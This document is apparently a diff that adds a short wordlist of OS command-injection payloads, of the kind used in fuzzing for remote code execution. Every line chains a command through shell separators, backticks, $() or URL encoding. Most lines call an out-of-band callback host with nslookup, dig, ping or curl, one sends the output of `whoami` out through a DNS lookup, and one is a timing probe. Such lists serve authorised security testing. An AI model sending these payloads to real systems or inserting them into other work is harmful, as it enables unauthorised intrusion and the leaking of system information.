@@ -1,0 +1,13 @@
+||nslookup+`whoami`.rcepoc.collabxyz.net|| 
+&nslookup callback.collabxyz.net&'\"`0&nslookup rcepoc.collabxyz.net&`' 
+dig rcepoc.collabxyz.net
+ping rcepoc.collabxyz.net
+nslookup rcepoc.collabxyz.net
+`ping rcepoc.collabxyz.net` 
+& ping -n 30 127.0.0.1 & 
+| curl http://rcepoc.collabxyz.net/.testing/rce.txt 
+& curl http://rcepoc.collabxyz.net/.testing/rce.txt 
+; curl https://rcepoc.collabxyz.net/.testing/rce_vuln.txt 
+&& curl https://rcepoc.collabxyz.net/.testing/rce_vuln.txt 
+curl https://rcepoc.collabxyz.net/.testing/rce_vuln.txt 
+$(`curl https://rcepoc.collabxyz.net/.testing/rce_vuln.txt?req=22jjffjbn`) localhost%26nslookup+rcepoc.collabxyz.nete%26
